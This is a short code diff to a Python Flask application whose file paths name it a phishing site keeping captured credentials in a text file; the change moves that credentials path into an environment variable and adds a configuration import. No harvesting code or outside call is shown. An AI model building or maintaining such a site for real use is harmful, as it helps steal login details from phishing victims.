@@ -1,7 +1,10 @@
 from flask import Flask, render_template, request, redirect, url_for
+import os 
+from my_configs import add_my_configs
+add_my_configs() 
 
 app = Flask(__name__)
-filename = '/var/www/phishing_site/resources/credentials.txt'
+filename = os.environ["phishing_site_credentials_path"]
 
 @app.route('/')
 def home():
